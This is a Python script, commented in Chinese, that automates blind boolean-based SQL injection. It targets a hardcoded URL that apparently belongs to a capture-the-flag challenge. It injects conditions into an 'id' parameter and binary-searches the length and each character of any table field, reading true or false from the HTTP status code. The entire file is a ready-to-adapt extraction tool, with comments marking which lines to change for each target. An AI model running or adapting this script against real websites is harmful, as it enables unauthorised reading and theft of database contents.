# -*- coding:utf-8 -*-

import requests
from argparse import ArgumentParser
#url,必须修改
url= 'http://35.227.24.107/0d1e3bde79/fetch?'
ss = requests.session()

#核心判断字段语句,必须修改。真则正确，假则错误
##eg.raw_payload="{id}=' or ({sql}){condition} and '1'='1"
raw_payload="id=1 and ({sql}){condition} "
#判断长度,一般不会改变
##eg.
length_sql = "select length(group_concat({field})) from {table} where {where}"

#猜表语句,sqliet用unicode,mysql用ord
#field__sql = "select unicode(substr(group_concat({field}),{index},1)) from {table} where {where}"
field__sql = "select ord(substr(group_concat({field}),{index},1)) from {table} where {where}"


#核心函数，必须修改，判断正确与否
def post(sql,condition,isPrint=False):
    payload = raw_payload.format(sql=sql,condition=condition)
    if isPrint:
        print("payload:%s"%payload)
    try:
        code = ss.get(url+payload).status_code
        if code >= 300:
            return False
        else:
            return True
    except Exception:
        pass

def binary_search_length(field, table, where):
    print('查询表: %s 中字段: %s 值的总长度' % (table, field))
    sql = length_sql.format(field=field,table=table,where=where if where else '1')
    len = binary_search(sql, 0, 200)
    print('表: %s 中字段: %s 值总长度为: %d' % (table, field, len))
    return len

def binary_search_value(field, table, where, total_length):
    result = ''
    for i in range(1, total_length+1):
        sql = field__sql.format(field=field, table=table, index=i, where=where if where else '1')
        value = chr(binary_search(sql,0,128))
        result += value
    print('查询结束，表: %s 中字段: %s 的内容为: %s' % (table, field, result))
    return result

def binary_search(sql, minV, maxV):
    median = (minV+maxV)//2
    if median == minV:
        return minV if post(sql, '='+str(minV)) else maxV
    if post(sql, '>='+str(median)):
        return binary_search(sql, median, maxV)
    else:
        return binary_search(sql, minV, median)	

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('-t', '--table', help='要查询的表名', required=True)
    parser.add_argument('-f', '--field', help='要查询的字段名', required=True)
    parser.add_argument('-w', '--where', help='查询条件')
    args = parser.parse_args()
    length = binary_search_length(args.field, args.table, args.where)
    binary_search_value(args.field, args.table, args.where, length)


